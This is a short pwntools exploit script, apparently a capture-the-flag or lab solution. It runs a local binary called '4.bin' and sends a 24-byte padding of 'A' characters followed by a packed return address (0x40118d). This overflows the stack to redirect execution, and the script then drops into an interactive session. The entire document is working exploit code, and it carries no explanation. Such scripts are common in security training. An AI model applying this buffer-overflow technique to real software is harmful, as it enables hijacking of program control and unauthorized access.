
from pwn import *

p = process("./4.bin")

p.send(b"A"*24 + p64(0x40118d))

p.interactive()
